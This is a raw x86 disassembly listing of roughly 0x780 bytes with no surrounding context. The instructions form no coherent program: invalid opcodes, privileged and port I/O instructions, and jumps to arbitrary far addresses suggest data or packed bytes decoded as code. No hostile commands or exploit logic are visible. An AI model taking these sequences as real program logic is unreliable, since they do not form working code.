  40c766:	mov    DWORD PTR [ecx],ebp
  40c768:	cmp    cl,BYTE PTR [edx-0x1e]
  40c76b:	mov    ds:0x932588b,eax
  40c770:	xchg   edx,eax
  40c771:	loope  0x40c722
  40c773:	cli    
  40c774:	jnp    0x40c79e
  40c776:	inc    eax
  40c777:	inc    edx
  40c778:	call   0xf5e9:0xeb667068
  40c77f:	push   esp
  40c780:	stos   DWORD PTR es:[edi],eax
  40c781:	jmp    0x40c77d
  40c783:	test   DWORD PTR [esi-0x2a],0x75e41052
  40c78a:	push   esi
  40c78b:	add    bl,BYTE PTR [edi-0x419b1791]
  40c791:	jae    0x40c7aa
  40c793:	outs   dx,BYTE PTR ds:[esi]
  40c794:	cdq    
  40c795:	loope  0x40c72d
  40c797:	(bad)  
  40c798:	out    0x56,al
  40c79a:	sbb    esp,DWORD PTR [ecx-0x59]
  40c79d:	call   0xb0b6:0xc13e12db
  40c7a4:	xchg   esi,eax
  40c7a5:	xor    al,0xb0
  40c7a7:	and    eax,0xe2c53000
  40c7ac:	aam    0x2a
  40c7ae:	test   BYTE PTR [edi],0xa7
  40c7b1:	mov    dh,0xba
  40c7b3:	imul   ebx,DWORD PTR [edi+esi*4],0xcbf877c6
  40c7ba:	scas   eax,DWORD PTR es:[edi]
  40c7bb:	(bad)  [eax+0x73dc41]
  40c7c1:	mov    ds:0x62b285f0,al
  40c7c6:	mov    ebx,0x69dc5a6e
  40c7cb:	rcr    BYTE PTR [ecx-0x25],0x50
  40c7cf:	adc    ebp,ebx
  40c7d1:	or     esi,DWORD PTR [ebp-0x75]
  40c7d4:	xor    al,0xb5
  40c7d6:	ins    DWORD PTR es:[edi],dx
  40c7d7:	pop    ebx
  40c7d8:	adc    eax,0x7bde6a70
  40c7dd:	and    ebx,esi
  40c7df:	sub    eax,0x2ffd013a
  40c7e4:	hlt    
  40c7e5:	pop    edi
  40c7e6:	jmp    0x40c7d3
  40c7e8:	jmp    0xbdd6d284
  40c7ed:	inc    BYTE PTR [ebp+0x9aab3af]
  40c7f3:	add    edi,ebp
  40c7f5:	cdq    
  40c7f6:	test   eax,0x1bb9f4e7
  40c7fb:	xchg   DWORD PTR [edi+0x57],ecx
  40c7fe:	dec    ebp
  40c7ff:	add    ebp,0x52
  40c802:	xor    eax,0xf399fb7c
  40c807:	jbe    0x40c884
  40c809:	pop    ss
  40c80a:	mov    bl,0x8f
  40c80c:	cdq    
  40c80d:	mov    eax,ds:0x5638d66a
  40c812:	fiadd  WORD PTR ds:[edx]
  40c815:	inc    ecx
  40c816:	cli    
  40c817:	leave  
  40c818:	test   DWORD PTR [ebx],esi
  40c81a:	mov    dl,0x2f
  40c81c:	mov    ebp,DWORD PTR [esi]
  40c81e:	jge    0x40c7ca
  40c820:	xor    BYTE PTR [eax+0x3acb0b82],dh
  40c826:	sbb    eax,DWORD PTR [edi+0x75881194]
  40c82c:	jbe    0x40c826
  40c82e:	cmp    ch,bl
  40c830:	ret    0x7c03
  40c833:	cmp    eax,0x3f11462d
  40c838:	loop   0x40c8a1
  40c83a:	sbb    DWORD PTR [edx-0x6dae5a26],0x96250db5
  40c844:	adc    dl,BYTE PTR [eax+0xb]
  40c847:	add    bh,al
  40c849:	pop    edi
  40c84a:	mov    edx,0x9a3726fa
  40c84f:	scas   eax,DWORD PTR es:[edi]
  40c850:	sbb    ebx,ebp
  40c852:	sbb    cl,bl
  40c854:	cmp    ecx,DWORD PTR [ecx+0x15bb686d]
  40c85a:	mov    ah,0x81
  40c85c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c85d:	jge    0x40c84b
  40c85f:	fist   DWORD PTR [esi]
  40c861:	push   ds
  40c862:	ficomp DWORD PTR [edx-0xc]
  40c865:	or     edi,DWORD PTR gs:[ecx+0x70]
  40c869:	aam    0x1c
  40c86b:	pusha  
  40c86c:	pop    edi
  40c86d:	or     edx,DWORD PTR [eax]
  40c86f:	cmp    BYTE PTR ds:0x64a27409,bh
  40c875:	out    dx,al
  40c876:	mov    bh,0x4
  40c878:	mov    eax,ds:0x7d97eeab
  40c87d:	dec    ecx
  40c87e:	es mov ebp,0x96f375f2
  40c884:	adc    ch,BYTE PTR [edx]
  40c886:	ins    DWORD PTR es:[edi],dx
  40c887:	adc    ah,BYTE PTR [ecx]
  40c889:	and    eax,0x22e8ab7c
  40c88e:	mov    al,ds:0xb6736127
  40c893:	dec    ebx
  40c894:	test   DWORD PTR [esi-0x1e020d81],esi
  40c89a:	pop    ebp
  40c89b:	mov    eax,ds:0xb64c23ed
  40c8a0:	sub    BYTE PTR ss:[edi+0x3ca23885],bh
  40c8a7:	ja     0x40c84c
  40c8a9:	inc    BYTE PTR [ebx]
  40c8ab:	es xchg esi,eax
  40c8ad:	xchg   esp,eax
  40c8ae:	(bad)  
  40c8af:	xchg   ebp,eax
  40c8b0:	cli    
  40c8b1:	pop    edx
  40c8b2:	sub    DWORD PTR [esi+0x18cbd9b1],ebp
  40c8b8:	clc    
  40c8b9:	sbb    DWORD PTR es:[ebx+0x39],ebp
  40c8bd:	repnz outs dx,DWORD PTR ds:[esi]
  40c8bf:	scas   eax,DWORD PTR es:[edi]
  40c8c0:	mov    ah,0x4a
  40c8c2:	in     al,dx
  40c8c3:	imul   esp,DWORD PTR [ebp+0x1198d5c2],0x76bf50d7
  40c8cd:	dec    ebx
  40c8ce:	icebp  
  40c8cf:	es adc eax,0x49059f5f
  40c8d6:	popa   
  40c8d7:	xchg   ecx,eax
  40c8d8:	imul   esi,DWORD PTR [esi],0xccd297c8
  40c8de:	jno    0x40c8ef
  40c8e0:	adc    bh,ch
  40c8e2:	dec    esi
  40c8e3:	mov    al,ds:0xf0c896da
  40c8e8:	pop    ss
  40c8e9:	xchg   esp,eax
  40c8ea:	(bad)  
  40c8eb:	hlt    
  40c8ec:	ficomp DWORD PTR [ebx+0x74]
  40c8ef:	mov    ds:0xe2a083f9,al
  40c8f4:	or     al,0xcf
  40c8f6:	push   es
  40c8f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c8f8:	jmp    0xb2a8:0x53edcc06
  40c8ff:	outs   dx,BYTE PTR ds:[esi]
  40c900:	adc    ch,BYTE PTR [ebp-0x2b]
  40c903:	and    DWORD PTR [ecx-0x5c],0xbed10edd
  40c90a:	sar    dh,0x7e
  40c90d:	adc    DWORD PTR [edx+eax*2+0x5d],ebx
  40c911:	and    BYTE PTR [ebp-0x5a140908],al
  40c917:	jg     0x40c927
  40c919:	lock dec ecx
  40c91b:	mov    ebp,0x417f40bf
  40c920:	mov    eax,ds:0xe6bc0612
  40c925:	fst    QWORD PTR [esi-0xfd4a2f3]
  40c92b:	mov    dl,0xeb
  40c92d:	inc    ecx
  40c92e:	mov    esi,0xf66db6d0
  40c933:	fcom   DWORD PTR [edx+ebp*8-0x23]
  40c937:	jmp    0x67c7:0xe9bddd18
  40c93e:	mov    DWORD PTR [esi+ebx*8+0x51f86b33],esp
  40c945:	mov    ds:0x8dfb884c,al
  40c94a:	(bad)  [edi+esi*8]
  40c94d:	push   0x37c55c88
  40c952:	cs push edi
  40c954:	or     BYTE PTR [edi-0x7c],0x2d
  40c958:	dec    ecx
  40c959:	push   cs
  40c95a:	xor    al,0x19
  40c95c:	pop    ds
  40c95d:	out    0xe0,al
  40c95f:	pushf  
  40c960:	cmp    BYTE PTR [ecx+0x5a279563],bl
  40c966:	pop    es
  40c967:	pop    edx
  40c968:	clc    
  40c969:	hlt    
  40c96a:	mov    BYTE PTR [eax+0x2a],al
  40c96d:	xor    BYTE PTR [edi+ebp*4+0x3d],bl
  40c971:	lds    ebx,FWORD PTR [eax-0x5f1cfc11]
  40c977:	xor    eax,0x7668bb2f
  40c97c:	mov    eax,ds:0x28f2602
  40c981:	gs add eax,0xc2669272
  40c987:	das    
  40c988:	push   0x54
  40c98a:	mov    ch,0x2d
  40c98c:	cs pop es
  40c98e:	pushf  
  40c98f:	jmp    0x76afd2f3
  40c994:	mov    dl,0x2d
  40c996:	push   esi
  40c997:	(bad)  
  40c998:	jo     0x40c98e
  40c99a:	sub    eax,0xdac93d6c
  40c99f:	loop   0x40c9f7
  40c9a1:	jnp    0x40c933
  40c9a3:	mov    edi,0x704b4bdc
  40c9a8:	aas    
  40c9a9:	adc    BYTE PTR [edi-0x65],dh
  40c9ac:	inc    ebp
  40c9ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c9ae:	xor    BYTE PTR [ebx+0xb152ac0],0x9f
  40c9b5:	inc    ebp
  40c9b6:	gs pop esp
  40c9b8:	iret   
  40c9b9:	cmp    al,cl
  40c9bb:	hlt    
  40c9bc:	test   eax,0x6ebc7864
  40c9c1:	ror    DWORD PTR [ebx+0x526d0dd8],1
  40c9c7:	adc    cl,dh
  40c9c9:	adc    ch,BYTE PTR [eax-0x59e44499]
  40c9cf:	dec    edx
  40c9d0:	jmp    0x40c96a
  40c9d2:	xor    ch,bl
  40c9d4:	mov    al,0x2a
  40c9d6:	sub    al,0x3f
  40c9d8:	ja     0x40ca33
  40c9da:	into   
  40c9db:	into   
  40c9dc:	fs test eax,0xd090e89c
  40c9e2:	pop    ebp
  40c9e3:	(bad)  
  40c9e4:	sub    ch,BYTE PTR [edi-0x27]
  40c9e7:	adc    ch,BYTE PTR [esi]
  40c9e9:	push   eax
  40c9ea:	inc    edi
  40c9eb:	dec    ebp
  40c9ec:	out    0x34,eax
  40c9ee:	dec    ebx
  40c9ef:	mov    ?,WORD PTR ss:[ebp-0x141ea8aa]
  40c9f6:	dec    esp
  40c9f7:	add    dl,BYTE PTR ds:0x1c30a54b
  40c9fd:	imul   esi,DWORD PTR [ebx-0x48],0xffffffc0
  40ca01:	and    DWORD PTR [edi-0x4a83b589],esi
  40ca07:	push   edx
  40ca08:	pop    ds
  40ca09:	jmp    0x36bc:0xc0193a5c
  40ca10:	in     eax,0x99
  40ca12:	jl     0x40ca1e
  40ca14:	ds out 0xc6,al
  40ca17:	dec    ebx
  40ca18:	mov    ecx,0x73c1b856
  40ca1d:	add    cl,BYTE PTR [eax]
  40ca1f:	sub    DWORD PTR [edx],0x19ead119
  40ca25:	sbb    BYTE PTR ds:0x3a49856b,dh
  40ca2b:	jg     0x40ca13
  40ca2d:	pop    edx
  40ca2e:	mov    ds:0xa36399e0,al
  40ca33:	idiv   BYTE PTR [ebx+ecx*4-0x1c]
  40ca37:	fisttp DWORD PTR es:[esi-0x71]
  40ca3b:	add    esp,DWORD PTR ss:[eax-0x26]
  40ca3f:	ret    
  40ca40:	add    bh,ch
  40ca42:	push   cs
  40ca43:	pop    ebx
  40ca44:	jne    0x40ca16
  40ca46:	mov    ah,0xbd
  40ca48:	cmp    al,0x2f
  40ca4a:	add    eax,DWORD PTR [edi]
  40ca4c:	push   eax
  40ca4d:	test   al,0x70
  40ca4f:	ds loop 0x40c9f6
  40ca52:	dec    bl
  40ca54:	or     al,0x6e
  40ca56:	ret    
  40ca57:	fscale 
  40ca59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca5a:	pop    edi
  40ca5b:	mov    ch,BYTE PTR [esi-0x5ec398a7]
  40ca61:	scas   eax,DWORD PTR es:[edi]
  40ca62:	push   edi
  40ca63:	mov    esp,0x78bcc965
  40ca68:	jle    0x40ca3c
  40ca6a:	or     DWORD PTR [edx],ebp
  40ca6c:	ja     0x40cae8
  40ca6e:	add    BYTE PTR [ecx-0x32],bl
  40ca71:	mov    esi,esi
  40ca73:	cmp    DWORD PTR [edx],esi
  40ca75:	popf   
  40ca76:	or     BYTE PTR [edx-0x39d48a43],cl
  40ca7c:	jae    0x40ca5c
  40ca7e:	aad    0x31
  40ca80:	push   eax
  40ca81:	fcomp  QWORD PTR ds:0x4f2540f9
  40ca87:	rcl    DWORD PTR [edx+0xf],0xdc
  40ca8b:	stc    
  40ca8c:	xor    BYTE PTR [di-0x42],0xe1
  40ca91:	fsubr  st(5),st
  40ca93:	out    dx,al
  40ca94:	imul   ebx,DWORD PTR [edx-0x68],0x5723a5a3
  40ca9b:	push   0x10
  40ca9d:	pop    ecx
  40ca9e:	gs sub eax,0xf32e9a44
  40caa4:	push   ebp
  40caa6:	push   edi
  40caa7:	inc    esi
  40caa8:	xor    ebx,edi
  40caaa:	lods   eax,DWORD PTR ds:[esi]
  40caab:	push   eax
  40caac:	es sub eax,0xb47db3e8
  40cab2:	mul    cl
  40cab4:	add    DWORD PTR [edx+eiz*2+0x59],0x22
  40cab9:	int    0x12
  40cabb:	jne    0x40ca4f
  40cabd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cabe:	popf   
  40cabf:	mov    ds:0x1023ab41,eax
  40cac4:	xor    DWORD PTR [edi+0x9057b8],edx
  40caca:	ret    0x9a94
  40cacd:	pop    eax
  40cace:	add    al,0xb5
  40cad0:	cmp    ebx,esp
  40cad2:	xor    ebx,DWORD PTR ds:0xc4e71648
  40cad8:	adc    esp,esi
  40cada:	popa   
  40cadb:	ficom  WORD PTR [esi]
  40cadd:	mov    gs,WORD PTR fs:[esi+0x320ef3ca]
  40cae4:	jbe    0x40ca95
  40cae6:	bound  ecx,QWORD PTR [eax-0x4d93440]
  40caec:	cli    
  40caed:	clc    
  40caee:	xchg   ecx,eax
  40caef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40caf0:	mov    ch,0x1f
  40caf2:	cli    
  40caf3:	test   BYTE PTR [esi-0x3e5178d3],al
  40caf9:	fsubr  st(1),st
  40cafb:	addr16 test al,0x21
  40cafe:	imul   edi,edx,0x50
  40cb01:	and    cl,BYTE PTR [ecx]
  40cb03:	dec    ecx
  40cb04:	int3   
  40cb05:	and    al,0x52
  40cb07:	adc    ah,bl
  40cb09:	pop    esp
  40cb0a:	int    0x6
  40cb0c:	out    0x5d,al
  40cb0e:	sub    eax,0xe8d49a9d
  40cb13:	lds    ebx,FWORD PTR [ebp+0x19]
  40cb16:	jns    0x40cb60
  40cb18:	xchg   esi,eax
  40cb19:	xor    edi,DWORD PTR ds:0x891142d9
  40cb1f:	pop    DWORD PTR [eax]
  40cb21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb22:	mov    cl,0x89
  40cb24:	(bad)  [ecx+ebp*1]
  40cb27:	xchg   esp,eax
  40cb28:	in     eax,0x94
  40cb2a:	mov    eax,0x8ad2889
  40cb2f:	mov    ecx,0xd5f01bd7
  40cb34:	lds    esp,FWORD PTR [ebp-0x45]
  40cb37:	jns    0x40cb4b
  40cb39:	test   al,0x3f
  40cb3b:	cmp    eax,DWORD PTR [ebx-0x21257f33]
  40cb41:	mov    dh,0x3a
  40cb43:	xchg   ebp,eax
  40cb44:	ds data16 test al,0x7e
  40cb48:	shl    DWORD PTR ds:0xc3f7f3ab,cl
  40cb4e:	dec    eax
  40cb4f:	mov    BYTE PTR [esi-0xe0f270b],0x2c
  40cb56:	aaa    
  40cb57:	call   0x4011:0x42261afa
  40cb5e:	mov    edx,DWORD PTR [esp+eiz*8]
  40cb61:	add    bl,0x24
  40cb64:	push   eax
  40cb65:	lods   eax,DWORD PTR ds:[esi]
  40cb66:	add    BYTE PTR ds:0x38a671ce,dl
  40cb6c:	jp     0x40cb48
  40cb6e:	mov    al,ds:0x374f0c3d
  40cb73:	sbb    al,0x7e
  40cb75:	mul    ecx
  40cb77:	jns    0x40cb51
  40cb79:	inc    DWORD PTR [edx]
  40cb7b:	push   es
  40cb7c:	(bad)  
  40cb7d:	push   ebx
  40cb7e:	pushf  
  40cb7f:	dec    edx
  40cb80:	retf   0xf3c6
  40cb83:	push   ds
  40cb84:	cdq    
  40cb85:	mov    esp,0x5b55137d
  40cb8a:	mov    ebp,0x5c771b96
  40cb8f:	push   cs
  40cb90:	mov    bl,0xb5
  40cb92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb93:	sub    BYTE PTR [edx],bl
  40cb95:	and    dh,dh
  40cb97:	out    0x6c,eax
  40cb99:	push   ebx
  40cb9a:	cmp    BYTE PTR [edx],bh
  40cb9c:	not    BYTE PTR [edi-0x31]
  40cb9f:	les    ebx,FWORD PTR [esi+0x7c7885d9]
  40cba5:	adc    cl,ah
  40cba7:	add    bl,BYTE PTR [ebx+ecx*8+0x24]
  40cbab:	mov    ecx,0xf55f551
  40cbb0:	ja     0x40cb9c
  40cbb2:	leave  
  40cbb3:	dec    ebx
  40cbb4:	dec    edx
  40cbb5:	ins    DWORD PTR es:[edi],dx
  40cbb6:	mov    edx,0xcddc1402
  40cbbb:	ja     0x40cba8
  40cbbd:	mov    ah,0xda
  40cbbf:	cmp    edi,DWORD PTR [edx]
  40cbc1:	sub    dh,ah
  40cbc3:	push   ebx
  40cbc4:	xor    eax,0x298f1d8c
  40cbc9:	xor    al,BYTE PTR [ebp+0x56047918]
  40cbcf:	lea    ecx,[edx+0x3a59f763]
  40cbd5:	jns    0x40cc49
  40cbd7:	push   ecx
  40cbd8:	lods   eax,DWORD PTR ds:[esi]
  40cbd9:	sub    al,0xd3
  40cbdb:	jns    0x40cb6d
  40cbdd:	bound  esp,QWORD PTR [esp+edx*4+0x6e4127ea]
  40cbe4:	mov    eax,ds:0x67c70ab2
  40cbe9:	clc    
  40cbea:	cmp    eax,0xb8240dda
  40cbef:	sub    BYTE PTR [edi+0x74],0xc5
  40cbf3:	mov    edi,0xaf75d0d9
  40cbf8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cbf9:	mov    eax,0x65756446
  40cbfe:	jmp    0xc2aabe58
  40cc03:	imul   eax,DWORD PTR [edx-0x2b],0xffffffe5
  40cc07:	nop
  40cc08:	cmp    eax,DWORD PTR [ecx]
  40cc0a:	push   ds
  40cc0b:	jno    0x40cc79
  40cc0d:	xchg   edx,eax
  40cc0e:	scas   eax,DWORD PTR es:[edi]
  40cc0f:	inc    eax
  40cc10:	xchg   ebx,eax
  40cc11:	xchg   ebp,eax
  40cc12:	dec    edi
  40cc13:	mov    dh,0xc8
  40cc15:	mov    edi,0xf2491c1e
  40cc1a:	pop    es
  40cc1b:	lds    ebx,FWORD PTR [ebx+0x5053a09a]
  40cc21:	dec    ebp
  40cc22:	push   0xffffffc2
  40cc24:	ins    BYTE PTR es:[edi],dx
  40cc25:	shl    BYTE PTR [edx],cl
  40cc27:	inc    ecx
  40cc28:	imul   edx,edx,0xffffffab
  40cc2b:	pop    ecx
  40cc2c:	cmc    
  40cc2d:	shr    BYTE PTR [ebx+0x271553a2],cl
  40cc33:	mov    ebx,0x7945ea88
  40cc38:	jmp    0x40cc36
  40cc3a:	push   cs
  40cc3b:	cdq    
  40cc3c:	into   
  40cc3d:	(bad)  
  40cc3e:	push   cs
  40cc3f:	push   esi
  40cc40:	add    BYTE PTR [edi-0x513a79aa],bh
  40cc46:	jno    0x40cca7
  40cc48:	rcr    DWORD PTR [eax+0x3cd361e9],cl
  40cc4e:	out    0x9c,eax
  40cc50:	nop
  40cc51:	add    al,0x3d
  40cc53:	imul   esp,DWORD PTR [edx+ebp*1+0x19],0xac6081d5
  40cc5b:	mov    bh,0x4a
  40cc5d:	std    
  40cc5e:	jo     0x40cc6d
  40cc60:	ds ds mov eax,ds
  40cc64:	cmc    
  40cc65:	mov    bl,0x5b
  40cc67:	iret   
  40cc68:	loopne 0x40cc9f
  40cc6a:	or     dl,cl
  40cc6c:	sbb    DWORD PTR [edx+0x0],eax
  40cc6f:	jmp    0x40ccd1
  40cc71:	jecxz  0x40cc8b
  40cc73:	shr    DWORD PTR [ebx+0x3a],0x41
  40cc77:	and    al,0x22
  40cc79:	dec    eax
  40cc7a:	push   edx
  40cc7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc7c:	sti    
  40cc7d:	sub    dl,BYTE PTR [eax-0x16]
  40cc80:	dec    ebx
  40cc81:	lods   al,BYTE PTR ds:[esi]
  40cc82:	icebp  
  40cc83:	push   edi
  40cc84:	xor    al,0x17
  40cc86:	lea    esi,[edi+0x24895f2]
  40cc8c:	xchg   BYTE PTR [edx+0x13],bh
  40cc8f:	mov    ch,0x50
  40cc91:	push   edx
  40cc92:	pop    ecx
  40cc93:	in     al,0x23
  40cc95:	jb     0x40cce9
  40cc97:	retf   0xc1ce
  40cc9a:	ss out dx,al
  40cc9c:	xor    BYTE PTR [edx-0x19933a0c],ah
  40cca2:	adc    bl,BYTE PTR [edi+0x60]
  40cca5:	cmp    edi,DWORD PTR [esi]
  40cca7:	pop    esi
  40cca8:	adc    eax,0xbd5170bf
  40ccad:	jmp    0x29b5:0xa14471ba
  40ccb4:	xor    ebp,DWORD PTR [ebx]
  40ccb6:	and    BYTE PTR [eax],ah
  40ccb8:	inc    ebx
  40ccb9:	pop    es
  40ccba:	and    eax,0xf6f3b1a
  40ccbf:	xchg   edi,eax
  40ccc0:	jp     0x40cc56
  40ccc2:	pop    eax
  40ccc3:	fs ja  0x40cc89
  40ccc6:	jp     0x40ccfa
  40ccc8:	neg    DWORD PTR [ecx]
  40ccca:	jl     0x40cd37
  40cccc:	cmp    eax,0xe13060f7
  40ccd1:	adc    DWORD PTR [ecx+ecx*4-0x4b6e5b7],ebx
  40ccd8:	sub    eax,0x39e92d85
  40ccdd:	popf   
  40ccde:	mov    dl,0xbe
  40cce0:	jg     0x40cc9f
  40cce2:	mov    WORD PTR [esi+0x65],?
  40cce5:	lods   eax,DWORD PTR ds:[esi]
  40cce6:	and    eax,0x360a7165
  40cceb:	pop    ebp
  40ccec:	mov    ch,0x4b
  40ccee:	call   FWORD PTR [eax+edi*4-0x51b17efe]
  40ccf5:	sbb    cl,BYTE PTR [esi+0x2d]
  40ccf8:	inc    ax
  40ccfa:	shr    BYTE PTR [esi],1
  40ccfc:	adc    edx,DWORD PTR [eax-0x33]
  40ccff:	xchg   ebp,eax
  40cd00:	pop    edi
  40cd01:	popa   
  40cd02:	or     edx,ecx
  40cd04:	dec    edi
  40cd05:	and    eax,DWORD PTR [ebx]
  40cd07:	push   0x7f
  40cd09:	mov    ch,0x30
  40cd0b:	add    edx,DWORD PTR [esi]
  40cd0d:	rdtsc  
  40cd0f:	mov    ds,ebp
  40cd11:	sub    al,0x52
  40cd13:	push   eax
  40cd14:	mov    esi,0x1f1ab698
  40cd19:	adc    DWORD PTR [ebp-0x71],edx
  40cd1c:	xchg   edi,eax
  40cd1d:	loop   0x40cd20
  40cd1f:	js     0x40ccb3
  40cd21:	lock pop ebx
  40cd23:	cdq    
  40cd24:	int3   
  40cd25:	mov    gs,WORD PTR [esp+ebp*1]
  40cd28:	mov    dl,0xaa
  40cd2a:	sbb    al,0xa1
  40cd2c:	add    al,0xc
  40cd2e:	sub    DWORD PTR [ecx-0x7f],ebp
  40cd31:	(bad)  
  40cd32:	daa    
  40cd33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd34:	pushf  
  40cd35:	lock (bad) 
  40cd37:	jmp    0x40cda9
  40cd39:	xor    BYTE PTR [edi-0x31],dl
  40cd3c:	mov    ah,0x2c
  40cd3e:	add    ebx,DWORD PTR [edi+0x20c7be41]
  40cd44:	jl     0x40ccee
  40cd46:	test   ecx,esi
  40cd48:	push   esp
  40cd49:	dec    ebp
  40cd4a:	adc    ebp,DWORD PTR [edx-0x5b]
  40cd4d:	loope  0x40ccd8
  40cd4f:	adc    DWORD PTR [esi],edi
  40cd51:	add    ebx,DWORD PTR [edi-0x52]
  40cd54:	inc    edi
  40cd55:	loop   0x40cdcb
  40cd57:	mov    ch,0x5e
  40cd59:	int    0x3f
  40cd5b:	rcr    DWORD PTR [edi+ecx*4-0x4852b2e6],0xc4
  40cd63:	dec    ebx
  40cd64:	in     eax,dx
  40cd65:	mov    ah,0x4e
  40cd67:	xchg   edi,eax
  40cd68:	(bad)  
  40cd69:	mov    fs,WORD PTR [eax+0x2c02416]
  40cd6f:	push   edi
  40cd70:	sub    bl,dh
  40cd72:	dec    ecx
  40cd73:	clc    
  40cd74:	mov    ds:0xe0168b7c,eax
  40cd79:	push   ds
  40cd7a:	(bad)
  40cd7e:	test   al,0xe5
  40cd80:	mov    ch,0xcc
  40cd82:	push   es
  40cd83:	(bad)  
  40cd84:	stos   DWORD PTR es:[edi],eax
  40cd85:	popa   
  40cd86:	push   0xd5ff4e80
  40cd8b:	and    ecx,esi
  40cd8d:	sbb    al,0x7d
  40cd8f:	in     eax,0x18
  40cd91:	mov    ebp,0xdd49027c
  40cd96:	push   0x603755c5
  40cd9b:	sub    ecx,eax
  40cd9d:	jl     0x40cd55
  40cd9f:	cmp    DWORD PTR ds:0x3dcd1bb8,edx
  40cda5:	push   cs
  40cda6:	add    esp,DWORD PTR [ecx-0x71441f45]
  40cdac:	div    edi
  40cdae:	retf   0x124b
  40cdb1:	dec    edi
  40cdb2:	leave  
  40cdb3:	js     0x40cd54
  40cdb5:	cmp    bl,BYTE PTR [ebp-0x5f]
  40cdb8:	sub    al,0xcf
  40cdba:	cwde   
  40cdbb:	and    DWORD PTR [edx+0x22],esi
  40cdbe:	in     al,dx
  40cdbf:	fcom   DWORD PTR [esi+esi*8+0x5a]
  40cdc3:	xchg   esi,eax
  40cdc4:	dec    ecx
  40cdc5:	mov    WORD PTR [edx+0x2730fc02],?
  40cdcb:	cmp    cl,BYTE PTR [esi+0x454ee28d]
  40cdd1:	iret   
  40cdd2:	jnp    0x40cda2
  40cdd4:	in     al,0xbe
  40cdd6:	push   0xffffffff
  40cdd8:	sahf   
  40cdd9:	dec    esi
  40cdda:	(bad)  
  40cddb:	jnp    0x40cdb1
  40cddd:	fdivrp st(0),st
  40cddf:	ss or  eax,0x5715927d
  40cde5:	lds    ebp,FWORD PTR [edx+0x65fa11b5]
  40cdeb:	std    
  40cdec:	mov    dh,dh
  40cdee:	int3   
  40cdef:	mov    dh,0xf0
  40cdf1:	out    dx,eax
  40cdf2:	rol    DWORD PTR [ebx+0x29],0x90
  40cdf6:	or     DWORD PTR [edx-0x61340eb0],esp
  40cdfc:	fucomp st(3)
  40cdfe:	ins    BYTE PTR es:[edi],dx
  40cdff:	jmp    0xcf8f7dc8
  40ce04:	adc    ecx,DWORD PTR [edx-0x3e74ee1d]
  40ce0a:	rol    DWORD PTR [esi-0x38],1
  40ce0d:	mov    al,0x3b
  40ce0f:	xchg   ebp,eax
  40ce10:	xchg   DWORD PTR [esi],esp
  40ce12:	lahf   
  40ce13:	push   ss
  40ce14:	pop    esp
  40ce15:	fdivr  st(1),st
  40ce17:	jae    0x40ce3f
  40ce19:	mov    ch,BYTE PTR [ecx]
  40ce1b:	in     eax,dx
  40ce1c:	mov    ds:0x7473cf43,al
  40ce21:	push   ebp
  40ce22:	inc    eax
  40ce23:	inc    ecx
  40ce24:	ret    
  40ce25:	push   esp
  40ce26:	aas    
  40ce27:	adc    DWORD PTR [esi],0x29b0cb2a
  40ce2d:	mov    cl,0x50
  40ce2f:	push   ebx
  40ce30:	div    BYTE PTR [eax+ebx*4]
  40ce33:	pop    es
  40ce34:	int3   
  40ce35:	lods   eax,DWORD PTR ds:[esi]
  40ce36:	out    dx,al
  40ce37:	test   BYTE PTR [ecx-0x63],bl
  40ce3a:	mov    eax,ds:0x62e3230e
  40ce3f:	(bad)  
  40ce40:	and    al,0x7
  40ce42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce43:	mov    al,0x57
  40ce45:	pop    es
  40ce46:	mov    ch,0xaf
  40ce48:	pcmpgtb mm7,QWORD PTR [eax-0x3d5de9fe]
  40ce4f:	fidiv  DWORD PTR [ebp+0x65]
  40ce52:	cmp    BYTE PTR [edi+0x16],cl
  40ce55:	inc    esi
  40ce56:	hlt    
  40ce57:	aam    0x1c
  40ce59:	mov    dl,0xfe
  40ce5b:	cs mov ch,0x32
  40ce5e:	aam    0xf5
  40ce60:	push   esp
  40ce61:	(bad)  
  40ce62:	jb     0x40ce85
  40ce64:	push   ebx
  40ce65:	xor    BYTE PTR [ebp-0x7a],0x9
  40ce69:	ins    DWORD PTR es:[edi],dx
  40ce6a:	and    BYTE PTR [edx],dh
  40ce6c:	aad    0x26
  40ce6e:	xchg   ebp,eax
  40ce6f:	bound  edx,QWORD PTR [esi+ebp*2+0x49]
  40ce73:	mov    ch,0xef
  40ce75:	repnz and al,0xd
  40ce78:	ror    BYTE PTR [esi-0x207bad2e],0xa5
  40ce7f:	add    esi,DWORD PTR [eax+ebx*4+0x275c4d4c]
  40ce86:	imul   BYTE PTR [edx-0x66484b26]
  40ce8c:	mov    eax,0x30621845
  40ce91:	dec    edx
  40ce92:	fist   DWORD PTR [ebp+0x2c6c5365]
  40ce98:	add    eax,0xa25255e9
  40ce9d:	ret    
  40ce9e:	test   eax,0xd67241f1
  40cea3:	stos   BYTE PTR es:[edi],al
  40cea4:	rol    DWORD PTR [edi+edi*1-0x31],1
  40cea8:	icebp  
  40cea9:	xchg   ebp,eax
  40ceaa:	mov    ch,BYTE PTR [ecx+0x3e]
  40cead:	repz adc dh,BYTE PTR [esi+0x6741c932]
  40ceb4:	mov    al,0xbd
  40ceb6:	mov    ah,0xac
  40ceb8:	jns    0x40ced5
  40ceba:	sysret 
  40cebc:	dec    esi
  40cebd:	psubw  mm7,QWORD PTR [esi-0x73d770fe]
  40cec4:	and    al,0xad
  40cec6:	cmp    eax,eax
  40cec8:	xor    ah,BYTE PTR [ebp+0xb]
  40cecb:	addr16 xchg edx,eax
  40cecd:	dec    ebx
  40cece:	repnz dec ecx
  40ced0:	rol    DWORD PTR [esi+edi*1+0x23],1
  40ced4:	not    eax
  40ced6:	adc    al,0x4a
  40ced8:	xor    BYTE PTR [esi-0x46ca0e2b],0xf2
  40cedf:	aad    0x8b
  40cee1:	in     al,dx
  40cee2:	or     BYTE PTR [ebp-0xb],bh
  40cee5:	push   0xe3f3eeff
